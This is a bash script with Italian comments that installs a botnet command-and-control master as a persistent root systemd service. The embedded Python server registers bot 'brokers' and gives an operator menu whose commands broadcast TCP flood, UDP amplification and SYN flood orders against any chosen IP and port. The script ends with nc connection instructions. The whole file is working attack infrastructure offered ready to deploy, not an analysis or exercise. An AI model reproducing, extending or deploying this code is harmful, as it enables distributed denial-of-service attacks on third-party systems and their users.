#!/bin/bash
# deploy_c2.sh - COMPLETE 1-CLICK C2 SYSTEMD SERVICE
# Esegui: chmod +x deploy_c2.sh && ./deploy_c2.sh

set -e

echo "🚀  Master Service..."

# 1. Crea directory
mkdir -p /opt/c2
cd /opt/c2

# 2. C2 Master completo
cat > c2_master.py << 'EOF'
#!/usr/bin/env python3
import socket, threading, json, time, os, sys, signal
from pathlib import Path

PID_FILE = "/var/run/c2_master.pid"
LOG_FILE = "/var/log/c2_master.log"
C2_PORT = 6667

class C2Master:
    def __init__(self):
        self.brokers = {}
        self.users = set()
        self.running = True
        self.daemonize()
    
    def daemonize(self):
        if os.fork() > 0: sys.exit(0)
        os.chdir('/')
        os.setsid()
        os.umask(0)
        if os.fork() > 0: sys.exit(0)
        
        # Redirect
        with open(LOG_FILE, 'a') as f:
            os.dup2(f.fileno(), sys.stdout.fileno())
            os.dup2(f.fileno(), sys.stderr.fileno())
        
        # PID
        with open(PID_FILE, 'w') as f:
            f.write(str(os.getpid()))
    
    def handle_connection(self, conn, addr):
        ip = addr[0]
        try:
            data = conn.recv(4096).decode().strip()
            
            if data.startswith("REGISTER:"):
                clients = int(data.split(":")[1])
                self.brokers[ip] = clients
                print(f"✅ [{ip}] {clients} clients | Total brokers: {len(self.brokers)}")
                conn.close()
                return
            
            # USER NC
            user_id = f"user_{len(self.users)}_{ip}"
            self.users.add(user_id)
            
            self.send_menu(conn)
            while True:
                cmd = conn.recv(1024).decode().strip()
                if not cmd: break
                self.handle_cmd(conn, cmd)
                
        except: pass
        finally:
            conn.close()
    
    def send_menu(self, conn):
        total_clients = sum(self.brokers.values())
        menu = f"=== TRUSTED C2 v2.1 PID:{os.getpid()} ===\n"
        menu += f"Brokers: {len(self.brokers)} | Clients: {total_clients} | Users: {len(self.users)}\n\n"
        menu += "COMANDI:\n"
        menu += "ddos_tcp IP PORT\n"
        menu += "ddos_udp IP PORT\n"
        menu += "syn IP PORT\n"
        menu += "list\n"
        menu += "stats\n"
        menu += "clear\n> "
        conn.send(menu.encode())
    
    def handle_cmd(self, conn, cmd):
        cmd = cmd.strip()
        if cmd.startswith("ddos_tcp"):
            _, ip, port = cmd.split()
            payload = json.dumps({"cmd":"TCP_FLOOD", "target":ip, "port":int(port)})
            self.broadcast(payload)
            conn.send(f"✅ TCP {ip}:{port} → {len(self.brokers)} brokers\n".encode())
        elif cmd.startswith("ddos_udp"):
            _, ip, port = cmd.split()
            payload = json.dumps({"cmd":"UDP_AMP", "target":ip, "port":int(port)})
            self.broadcast(payload)
            conn.send(f"✅ UDP {ip}:{port} → ALL\n".encode())
        elif cmd.startswith("syn"):
            _, ip, port = cmd.split()
            payload = json.dumps({"cmd":"SYN_FLOOD", "target":ip, "port":int(port)})
            self.broadcast(payload)
            conn.send(f"✅ SYN {ip}:{port} → ALL\n".encode())
        elif cmd == "list":
            conn.send(json.dumps(self.brokers, indent=2).encode() + b"\n")
        elif cmd == "stats":
            total = sum(self.brokers.values())
            conn.send(f"Brokers:{len(self.brokers)} Clients:{total} Users:{len(self.users)}\n".encode())
        elif cmd == "clear":
            conn.send(b"\033[2J\033[H")
        self.send_menu(conn)
    
    def broadcast(self, payload):
        dead = []
        for ip in self.brokers:
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((ip, 6667))
                s.send(payload.encode())
                s.close()
            except:
                dead.append(ip)
        for d in dead: del self.brokers[d]
    
    def run(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', C2_PORT))
        server.listen(50)
        print(f"C2 PID:{os.getpid()} PORT:{C2_PORT} LOG:{LOG_FILE}")
        
        while self.running:
            try:
                conn, addr = server.accept()
                threading.Thread(target=self.handle_connection, args=(conn, addr), daemon=True).start()
            except: break

def handler(signum, frame):
    os.unlink(PID_FILE)
    sys.exit(0)

signal.signal(signal.SIGTERM, handler)
signal.signal(signal.SIGINT, handler)

C2Master().run()
EOF

chmod +x /opt/c2/c2_master.py

# 3. Systemd service
cat > /etc/systemd/system/c2master.service << EOF
[Unit]
Description=Trusted C2 Master Service
After=network.target

[Service]
Type=forking
User=root
WorkingDirectory=/opt/c2
ExecStart=/opt/c2/c2_master.py
PIDFile=/var/run/c2_master.pid
Restart=always
RestartSec=3
StandardOutput=null
StandardError=/var/log/c2_master.log

[Install]
WantedBy=multi-user.target
EOF

# 4. Install + Start
systemctl daemon-reload
systemctl enable c2master
systemctl start c2master

# 5. Setup logrotate
cat > /etc/logrotate.d/c2_master << 'EOF'
/var/log/c2_master.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
}
EOF

echo "✅ C2 MASTER INSTALLATO!"
echo ""
echo "📊 STATUS:"
systemctl status c2master --no-pager -l
echo ""
echo "📜 LOGS:"
tail -5 /var/log/c2_master.log
echo ""
echo "🌐 CONNETTI:"
echo "nc $(curl -s ifconfig.me) 6667"
echo ""
echo "🔧 COMANDI:"
echo "systemctl start/stop/restart c2master"
echo "tail -f /var/log/c2_master.log"
echo "cat /var/run/c2_master.pid"
echo ""
echo "🎯 PRONTO! nc IP_VPS 6667"
